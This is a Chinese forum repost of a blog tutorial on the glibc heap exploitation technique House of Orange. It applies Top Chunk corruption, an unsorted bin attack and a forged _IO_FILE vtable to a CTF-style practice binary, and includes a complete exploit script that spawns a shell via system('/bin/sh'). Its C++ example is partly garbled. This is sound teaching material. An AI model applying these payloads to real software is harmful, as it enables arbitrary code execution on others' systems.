> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1539815-1-1.html)

> [md] 实验室的项目验收太忙了，加上参加了各种奇奇怪怪的比赛，咕了好久 emmmmm 转自自己的博客 [https://hack1s.fun/](https://hack1s.fun/) 在上次介绍过了 Uns......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒 _ 本帖最后由 呆毛王与咖喱棒 于 2021-11-7 17:25 编辑_  

实验室的项目验收太忙了，加上参加了各种奇奇怪怪的比赛，咕了好久 emmmmm

转自自己的博客 [https://hack1s.fun/](https://hack1s.fun/)

在上次介绍过了 Unsortedbin attack 之后，再稍微进一步看一个更复杂一些的利用

House of Orange

这种利用技巧源于一道 Hitcon CTF 的同名题目，不过之后也有一些其他的变形

IO_FILE
-------

在看 House of Orange 的例子之前，我们首先了解一个 Linux 中的利用机制

`_IO_FILE`

使用 gdb 随便调试一个程序

例如`gdb /bin/sh`

之后`start`加载这个 binary 所有的依赖库文件

可以使用`ptype /o struct _IO_FILE`查看这个结构的定义

`/o`是在输出是显示偏移 (offset)

在 pwndbg 中可以直接写为`dt FILE`

dt 是 pwndbg 的指令`dump type`

如果要用 dt 查看其他结构需要用上引号`dt "struct _IO_FILE"`

![](https://static.hack1s.fun/images/2021/11/04/image-20211104165713039.png)

`_IO_FILE`这个结构体中有一个`_chain`可以看到它的类型是一个`struct _IO_FILE *`，也就是说是一个指向其他`_IO_FILE`结构体的指针；

在使用`fopen`之类的函数打开一个文件之后，实际上系统会在堆上创建一个这样的`_IO_FILE`结构体，并将其加入到一个单链表中，单链表的头部为`_IO_list_all`，这个单链表可以理解为是一个专门存储`_IO_FILE`的 fastbin

在 gdb 中输出`_IO_list_all`，可以看到这个的类型是`_IO_FILE_plus`

![](https://static.hack1s.fun/images/2021/11/07/image-20211104171644172.png)

输出这一个结构的类型，可以看到这个结构实际上就是`_IO_FILE`加上了一个`vtable`

![](https://static.hack1s.fun/images/2021/11/04/image-20211104171711191.png)

(下面的子节介绍了虚函数表的知识，可以看完之后再跳回来）

那这个`_IO_list_all`结构体里面这个 vtable 是干什么用的呢？

为什么会用到 C++ 里面的这种虚函数表呢

实际上 GNU 的 C++ 库和 C 库联系非常的紧密，调试 C++ 程序的时候可以发现其实一些 C++ 的库函数底层实现都是借助 C 库的函数完成的

例如 C++ 的方法`make_shared()`、`make_unique()`等底层实际上也都是通过`malloc`实现的

这里的这个 vtable 实际上是为了与 C++ 的`streambuf`类兼容才会出现的

但是这里兼容性上的问题，让 GLIBC 的 file stream 有可能存在虚函数表劫持的漏洞

另一方面，我们知道 Linux 的文件系统中一切皆为文件

每一个进程创建时都会有三个标准 I/O File Stream：

*   `stdin`
*   `stdout`
*   `stderr`

即使程序没有输出、没有输入，它也会存在这三个标准的 I/O

还是以前面 gdb 打开的`/bin/sh`为例，查看它的`_IO_list_all`可以看到上面的三项内容

分别就是这三个标准的 I/O

![](https://static.hack1s.fun/images/2021/11/04/image-20211104175918057.png)

这个程序甚至还没有运行起来

所以即使一个程序没有用到文件，我们仍然是有可能利用到 I/O File Stream 的

### 虚函数表

这个 vtable 是一个虚函数表

这边需要补充一些 vtable 的相关知识

像 C++ 这样的编程语言有一个机制叫做多态，参照菜鸟教程的例子

  
[C++] _纯文本查看_ _复制代码_

```
#include using namespace std;
 
class Shape {
   protected:
      int width, height;
   public:
      Shape( int a=0, int b=0)
      {
         width = a;
         height = b;
      }
      virtual int area()
      {
         cout << "Parent class area :" <area();
 
   // 存储三角形的地址
   shape = &tri;
   // 调用三角形的求面积函数 area
   shape->area();
    
   return 0;
} 
```

这里面有一个`Shape`类，另外有两个子类`Rectangle`和`Triangle`

有一个`area`方法用于计算面积，但是三角形好正方形算面积的方法是不同的

同样调用的是 area，编译器怎么就知道该去链接到哪一个函数呢

父类`Shape`的`area`是一个虚函数，编译器编译的时候不会链接到这个函数

实际上在创建`rec`对象和`tri`对象的时候，每个对象会有一个指向虚函数表的指针

这个指针会指向真正在链接时需要链接到的函数

在 C++ 程序的 exploitation 中，一个比较常见的攻击方法就是劫持虚函数表

将一个对象的 vtable pointer 利用溢出等漏洞修改为我们伪造的一个函数表，这样每次触发应该调用的方法时就会执行伪造的地址指向的函数

House of orange
---------------

### 原理

House of orange 的核心思想主要是这样几部分：

*   **不使用 free 函数而得到一个 free chunk**
*   伪造 vtable

具体而言，获取 free chunk 的实现方法是修改`Top Chunk`

在 [House of Force](https://hack1s.fun/2021/03/08/heaplab-house_of_force/) 中使用的方法是修改`Top Chunk`为一个特别大的值，之后我们申请一个特别大的 chunk，循环一遍内存之后就可以访问到原本`Top Chunk`上方的内容

那如果将`Top Chunk`修改为一个很小的值呢？

![](https://static.hack1s.fun/images/2021/11/05/image-20211105215326883.png)

在我们最开始学习堆的时候有了解到，`malloc`分配内存的时候实际上更底层是通过`sbrk`的调用拓展内存的空间的，这里图中绿色的线表示的就是`brk`目前分配到的位置

假如我们把`Top Chunk`修改为一个很小的数，这时再申请一个更大的 chunk

内存认为的`Top Chunk`是无法满足申请空间的需求的，因此堆管理器后续会再使用`brk`申请一块新的区域

<img src="[https://static.hack1s.fun/images/2021/11/05/image-20211105215825040.png](https://static.hack1s.fun/images/2021/11/05/image-20211105215825040.png)"alt="image-20211105215825040" />

正常来说堆管理器会直接将通过`brk`分配的新内存直接并入到 Top Chunk 中（即让 Top Chunk 变大）

但是由于我们改小了 Top Chunk，堆管理器认为 Top Chunk 与堆的尾部并不相邻

因此会将原本的 Top Chunk Free 掉

这样一番过程下来，我们就没有通过 Free 函数得到了一个 Free chunk

根据修改的 Top Chunk 大小，我们可以利用这个 Free Chunk 来实现 [Unsorted bin attack](https://hack1s.fun/2021/11/05/heaplab-unsorted-bin/)

利用 Unsorted bin attack 结合`IO_FILE`的伪造就可以直接 getshell

### 实践

检查安全措施，可以看到这个程序开启了 Canary 和 NX、got 表不可写并且开启了随机化

![](https://static.hack1s.fun/images/2021/11/07/image-20210716114412343.png)

尝试运行一下

![](https://static.hack1s.fun/images/2021/11/07/image-20210716113739424.png)

这里使用到的程序有这样三个选项，可以申请两次小 chunk 和一次大 chunk

申请之后在 gdb 中可以看到

![](https://static.hack1s.fun/images/2021/11/07/image-20210716114539341.png)

小的 chunk 是 0x20 大小，而大的 chunk 大小是 0xfd0

这个示例程序的漏洞在于 edit 函数，没有进行长度检查，可以溢出后面的 chunk

但是 edit 只允许修改第一个 small chunk

那么就按照前面说的思路首先修改 Top Chunk 为一个比较小的值，之后再申请这个大的 chunk

为了使用 unsortedbin attack，这个大小我们先定为 0x100

小 chunk 大小为 0x20，可用的内容应该是 0x18，所以我们的 payload 为

```
small_malloc()
edit(b'Y'*0x18+p64(0x101))

```

![](https://static.hack1s.fun/images/2021/11/06/image-20211106143507749.png)

运行后可以看到 Top Chunk 被我们改写为了 0x101

这时我们再申请一个 large chunk

![](https://static.hack1s.fun/images/2021/11/06/image-20211106170643358.png)

但是并没有顺利执行，遇到了一个这样的报错

使用`f 3`切换 frame 到 sysmalloc，可以看到在 malloc 里面实际上是因为一个`assert`语句出现了错误

![](https://static.hack1s.fun/images/2021/11/06/image-20211106170800497.png)

我们仔细看一下这里报错的语句，核心检查的地方其实是这两句

```
prev_inuse (old_top) &&
  ((unsigned long) old_end & (pagesize-1)) == 0

```

前一句很简单，就是说`Top Chunk`的`prev_inuser`位一定需要为 1

后一句则是在检查 Top Chunk 是否在一个页的边界结尾，即是否按页对齐了

这里报错主要是这个页对齐检查没有通过

所以我们伪造的 top chunk 大小需要进行修改

在 Top Chunk 之前我们申请了一个 0x20 大小的 chunk，因此这个大小我们伪造为 0x1000-0x20

```
small_malloc()
edit(b'Y'*0x18+p64(0x1000-0x20+1))
large_malloc()

```

再次运行，可以看到就没有出错了

<img src="[https://static.hack1s.fun/images/2021/11/06/image-20211106212850029.png](https://static.hack1s.fun/images/2021/11/06/image-20211106212850029.png)"alt="image-20211106212850029" />

可以看到我们在这里得到了一个 unsorted bin

那么接下来就是利用 unsorted bin attack 了

利用 unsorted bin attack 我们可以将 main_arena 写到任意地址

不过我们往哪里写这个值呢？

House of Orange 接下来的步骤就是利用 unsorted bin attack 篡改`_IO_list_all`的指针

```
small_malloc()
edit(b'Y'*0x18+p64(0x1000-0x20+1))
large_malloc()
edit(b"Y"*0x18+p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 0x10))

```

我们获取到这个 unsorted bin 之后修改 fd、bk

fd 写成任意一个值，bk 改为`_IO_list_all`指针前 0x10 的值

之后再申请一个小的 chunk

这样在申请时就会遍历 unsorted bin，将这个 unsorted bin unlink

![](https://static.hack1s.fun/images/2021/11/06/image-20211106220920003.png)

执行之后可以看到这时`_IO_list_all`已经指向`main_arena`中的值了

正常来说，在程序退出时会对`_IO_list_all`中的文件进行关闭（flush）

这个退出可能是调用了`exit`，也可能是正常的从`main`函数中`return`

这里下一个断点观察一下程序的行为

```
set breakpoint pending on
b _IO_flush_all_lockp

```

选择 4 quit 的操作

断在了这个函数，看到 backtrace 里面，这个`_IO_flush_all_lockp`是由`_IO_cleanup`调用的

![](https://static.hack1s.fun/images/2021/11/07/image-20211106221649773.png)

继续运行，不出意外肯定会报错

![](https://static.hack1s.fun/images/2021/11/06/image-20211106221829226.png)

这里错误是因为`main_arena`被当作`File Stream`对待

我们希望触发的是`_IO_OVERFLOW(fp,EOF)`这一行

在这之前第一句进行了两个检查

```
fp->mode <=0 && fp-> _IO_write_ptr > fp-> _IO_write_base

```

![](https://static.hack1s.fun/images/2021/11/06/image-20211106222318329.png)

这里被解析时`_mode`被认为是一个负数，程序认为这个 File Stream 不需要被关闭

于是直接去看下一个 FileStream 了

下一个 File Stream 是去找了`_chain`这个对象指向的位置，我们可以看到这里仍然在`main_arena`中

这里是`main_arena+168`，值为`0x7ffff7dd4bc8`的位置

![](https://static.hack1s.fun/images/2021/11/07/image-20211107144241332.png)

关于`main_arena`的结构，我们可以复习一下这张图

![](https://static.hack1s.fun/images/2021/03/10/image-20210310161659389.png)

图中`Top Chunk`是`0x555555778fd0`，`unsortedbin fd`是`0x555555757020`

依次对应下来图中红框标记出来的 `0x7ffff7dd4bc8`对应的是 0x60 的 smallbins

所以在第一次`_IO_flush_all_lockp`执行失败后会顺着`_chain`找到这个 0x60 的 smallbins 进一步处理

那我们如果将一个伪造的 FileStream 数据填到这里就可以执行对应的内容了

还记得前面我们伪造了一个 unsortedbin 的大小吗？

如果我们将 unsortedbin 的大小伪造为 0x60，在申请一个 0x20 大小的 chunk 时，这个 unsortedbin 就会被 sort 到这个 0x60 的 smallbins 中

也就是说我们直接在这个 bins 中伪造数据，就会被解析为 FileStream 了

修改一下 payload

```
small_malloc()
edit(b'Y'*0x18+p64(0x1000-0x20+1))
large_malloc()
edit(b"Y"*0x18+p64(0x61) + p64(0) + p64(libc.sym._IO_list_all - 0x10))

```

那么伪造 File Stream 的数据都需要填哪些呢?

先暂且不修改后面的内容，运行一下，看看这个 smallbins 的位置是如何被解析的

![](https://static.hack1s.fun/images/2021/11/07/image-20211107153214604.png)

这篇博客开始时我们讲到用 dt FILE 查看`_IO_FILE`结构

<img src="[https://static.hack1s.fun/images/2021/11/04/image-20211104165713039.png](https://static.hack1s.fun/images/2021/11/04/image-20211104165713039.png)"alt="image-20211104165713039" />

对应来看的话，原本 chunk 的 size 字段是`_IO_read_ptr`

flags 对应的是`prev_size`的地方，所以我们 edit 修改数据时填充可以少 8 个字节

想要触发`overflow`函数，需要满足的条件是

![](https://static.hack1s.fun/images/2021/11/06/image-20211106221829226.png)

这里写到的`fp->mode <=0`并且`fp-> _IO_write_ptr > fp-> _IO_write_base`

那么我们对应的设置一下这些值

在`wirte_end`及之后的内容直到`mode`都是对我们没用的数据，直接先填 0

这部分数据长度从`0x30`到`0xc0`，用`p64(0)*18`来填充

```
payload = b"Y"*0x10

flags = b"Y"*0x8

fake_size = p64(0x61)
fd = p64(0)
bk = p64(libc.sym._IO_list_all - 0x10)
write_base = p64(1)
write_ptr = p64(2)
mode = p32(0)

payload = payload + flags
payload = payload + fake_size
payload = payload + fd
payload = payload + bk
payload = payload + write_base
payload = payload + write_ptr         
payload = payload + p64(0)*18
payload = payload + p32(mode) + p32(0) + p64(0)*2

```

到这里为止，后面还有一部分没有用到的空间，是`_IO_FILE`结构中最后的`unused`部分有 20 个字节

我们也全部用 0 填充

以上内容就构造完毕了`_IO_FILE`结构，但是关键的`vtable`指针还没有修改

![](https://static.hack1s.fun/images/2021/11/07/image-20211107162106998.png)

要伪造的 vtable 本身只是填一个任意的我们可以控制的区域的地址就可以

为了节省一些空间，我们让这个指针指回到伪造的`_IO_FILE`中

那么计算一下 vtable 的值，从 heap 开始的位置，首先加上是`0x20`大小的一个 small chunk

加上`0xd8`大小的整个伪造的`_IO_FILE`结构

减去重合的 8 字节

最后是减去 overflow 函数的地址偏移 24 即 0x18

修改一下之前 payload 的最后一部分

```
vtable = heap + 0x20 + 0xd8 - 0x8 - 0x18

payload = payload + p32(mode) + p32(0) + p64(0) + p64(overflow)
payload = payload + p64(vtable)

```

最后就是`overflow`的值了

这里有两个选择，一是可以直接填写一个 one_gadget

或者我们可以回忆一下，overflow 函数调用时的样子

![](https://static.hack1s.fun/images/2021/11/06/image-20211106221829226.png)

实际上调用的参数是`fp`，也就是最开始的 flags

毕竟整个`_IO_FILE`都是我们伪造的内容，因此这个`flags`也可以直接控制

那么另一个简单的方法就是修改为

```
flags = b"/bin/sh\x00"
overflow = libc.sym.system

```

那么最终完整的部分为

```
#----- 修改Top Chunk得到一个Free chunk
small_malloc()
edit(b"Y"*0x18 + p64(0x1000-0x20+0x1))
large_malloc()

#-----伪造IO_FILE劫持vtable
payload = b"Y"*0x10
flag = b'/bin/sh\x00'

fake_size = p64(0x61)
fd = p64(0)
bk = p64(libc.sym._IO_list_all - 0x10)
write_base = p64(1)
write_ptr = p64(2)
mode = p32(0)
vtable = p64(heap + 0xd8)                                                                                                                             
overflow = p64(libc.sym.system)

payload = payload + flag
payload = payload + fake_size
payload = payload + fd
payload = payload + bk
payload = payload + write_base
payload = payload + write_ptr
payload = payload + p64(0)*18
payload = payload + mode + p32(0) + p64(0) + overflow
payload = payload + vtable

edit(payload)

#-----触发操作让unsortedbin被sort
small_malloc()

```

执行一下脚本，虽然报了一堆错误，但是执行下来还是弹回来了一个 shell

![](https://static.hack1s.fun/images/2021/11/07/image-20211107165153724.png)

这就是 House Of Orange 的完整过程了，确实很巧妙，并且过程也比之前学到的内容复杂一些

不好理解的话实际动手写一下就会好很多

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[house_of_orange.zip](forum.php?mod=attachment&aid=MjM0NDY0MnwzMDc4MDYyYnwxNjM2NTQ4NTM4fDIxMzQzMXwxNTM5ODE1)

2021-11-7 17:17 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

5.77 KB, 下载次数: 1, 下载积分: 吾爱币 -1 CB ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) 技术大神啊  这个看起来好吃力  技术达不到 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) joyplay 正好在学习  感谢大神了 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)往复随安严 y 支持大神 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) aoyoudazhen888 学习了，支持 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) vanhoo 期待楼主出一期架设游戏的 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) qq74746 学习了，666![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)hswei 学习了不错![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)咔 c 君 jhkmbnkfyujgnhfgcjch![](https://avatar.52pojie.cn/data/avatar/000/34/71/43_avatar_middle.jpg)Kok 丶 Ronin 学习了！大佬太强了！谢谢！期待更多好作品 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) longestusername 感谢大神，正需要这些基础知识，赶紧收藏备用！